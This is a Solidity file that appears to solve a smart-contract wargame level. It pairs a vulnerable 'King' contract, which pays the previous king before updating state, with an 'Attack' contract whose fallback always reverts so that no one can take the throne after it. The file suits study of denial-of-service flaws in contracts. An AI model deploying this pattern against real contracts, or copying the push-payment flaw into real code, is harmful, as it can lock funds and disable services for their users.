// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }

}

contract Attack {
    
    constructor (address payable _king) public payable {
        (bool success, ) = _king.call{value:msg.value}("");
        require(success, "Revert");
    }

    fallback() external payable {
        revert("I refuse to take your money");
    }
}